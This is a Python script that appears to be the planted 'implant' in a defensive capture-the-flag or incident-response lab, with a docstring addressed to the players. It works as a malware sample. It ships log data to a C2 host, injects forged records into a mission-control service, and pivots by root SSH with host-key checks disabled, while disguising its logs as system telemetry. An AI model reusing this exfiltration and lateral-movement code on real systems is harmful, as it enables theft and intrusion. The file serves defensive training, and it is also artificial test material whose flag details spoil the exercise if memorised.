#!/usr/bin/env python3
"""The implant resident on SENTINEL-01.

It performs three of the brief's attacker objectives and keeps a foothold:

  * exfil    -- continuously ships the track feed to the C2 (relay:4443).
                This flow looks like the legitimate uplink to a casual observer;
                both are plain outbound TCP carrying track-shaped JSON.
  * forge    -- injects fake track records into Mission Control. They claim the
                blinded sector, but they fail HMAC authentication.
  * pivot    -- repeatedly SSHes into SENTINEL-02 over the trusted key until the
                trust is cut, planting a foothold that can plant back.

Its own environment carries a flag fragment (SW_LIVE_TOKEN). Read it from
/proc/<pid>/environ *before* you eradicate the process -- the fragment does not
survive removal.
"""
import json
import os
import socket
import subprocess
import sys
import threading
import time

C2_HOST = os.environ.get("C2_HOST", "relay")
C2_PORT = int(os.environ.get("C2_PORT", "4443"))
UPLINK_HOST = os.environ.get("UPLINK_HOST", "mission-control")
UPLINK_PORT = int(os.environ.get("UPLINK_PORT", "9000"))
SECTORS = int(os.environ.get("SECTOR_COUNT", "6"))
PIVOT_TARGET = os.environ.get("PIVOT_TARGET", "sentinel-02")

TRACKLOG = "/var/log/sentinel/tracks.log"
STAGE_DIR = "/dev/shm/.cache"
STAGE = os.path.join(STAGE_DIR, "track_export.json")
MARKER = "/run/sentinel/.shadow"
KEY = "/root/.ssh/sensor_trust"
PLANT = "/usr/local/sbin/pivot_plant.sh"

FRAG_B = "SPOOL-9F4E"


def say(msg):
    try:
        with open("/dev/log", "a") as fh:
            fh.write(f"sysmon-telemetry: {msg}\n")
    except OSError:
        pass


def stage_export():
    """Stage the theft next to the feed it is stealing."""
    os.makedirs(STAGE_DIR, exist_ok=True)
    payload = {
        "note": "track export staging",
        "token": FRAG_B,
        "staged_at": time.time(),
    }
    with open(STAGE, "w") as fh:
        json.dump(payload, fh)


def exfil_loop():
    while True:
        try:
            chunk = ""
            if os.path.exists(TRACKLOG):
                with open(TRACKLOG, "r", errors="replace") as fh:
                    chunk = "".join(fh.readlines()[-20:])
            body = json.dumps({"token": FRAG_B, "feed": chunk}) + "\n"
            with socket.create_connection((C2_HOST, C2_PORT), timeout=5) as sock:
                sock.sendall(body.encode())
            say("uplink batch delivered")
        except Exception as exc:  # noqa: BLE001
            say(f"uplink retry: {exc}")
        time.sleep(3)


def forge_loop():
    while True:
        try:
            rec = {
                "sensor": "sentinel-01",
                "sector": 4,
                "seq": 0,
                "ts": f"{time.time():.3f}",
                "hmac": "forged",
            }
            with socket.create_connection((UPLINK_HOST, UPLINK_PORT), timeout=5) as sock:
                sock.sendall((json.dumps(rec, sort_keys=True) + "\n").encode())
            say("injected track sector=4")
        except Exception as exc:  # noqa: BLE001
            say(f"inject retry: {exc}")
        time.sleep(5)


def pivot_loop():
    while True:
        try:
            res = subprocess.run(
                ["ssh", "-i", KEY,
                 "-o", "StrictHostKeyChecking=no",
                 "-o", "UserKnownHostsFile=/dev/null",
                 "-o", "ConnectTimeout=5",
                 "-o", "BatchMode=yes",
                 f"root@{PIVOT_TARGET}", PLANT],
                capture_output=True, timeout=25,
            )
            say(f"pivot -> {PIVOT_TARGET}: rc={res.returncode}")
        except Exception as exc:  # noqa: BLE001
            say(f"pivot retry: {exc}")
        time.sleep(45)


def main():
    os.makedirs(os.path.dirname(MARKER), exist_ok=True)
    with open(MARKER, "w") as fh:
        fh.write(f"implant pid={os.getpid()} since={time.time()}\n")
    stage_export()
    say("telemetry helper started")
    threading.Thread(target=exfil_loop, daemon=True).start()
    threading.Thread(target=forge_loop, daemon=True).start()
    threading.Thread(target=pivot_loop, daemon=True).start()
    while True:
        say("heartbeat")
        time.sleep(30)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
